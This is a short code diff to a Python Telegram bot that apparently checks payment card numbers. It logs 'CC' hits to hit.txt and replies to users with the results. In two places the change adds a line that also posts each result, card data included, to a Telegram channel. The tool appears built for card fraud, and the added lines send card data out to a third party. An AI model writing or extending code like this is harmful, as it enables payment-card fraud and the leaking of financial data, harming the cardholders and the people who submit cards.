@@ -128,6 +128,7 @@ def main(message):
 '''
                         print(Fore.YELLOW + cc + "->" + Fore.GREEN + last)
                         bot.reply_to(message, respo)
+                        bot.send_message(channel_username, respo)
                         with open("hit.txt", "a") as f:
                             f.write(f'''
 𝗖𝗖 ⇾ {cc}
@@ -143,6 +144,7 @@ def main(message):
 ''')
                         print(Fore.YELLOW + cc + "->" + Fore.GREEN + last)
                         bot.reply_to(message, respo)
+                        bot.send_message(channel_username, respo)
                         with open("hit.txt", "a") as f:
                             f.write(f'''
 𝗖𝗖 ⇾ {cc}
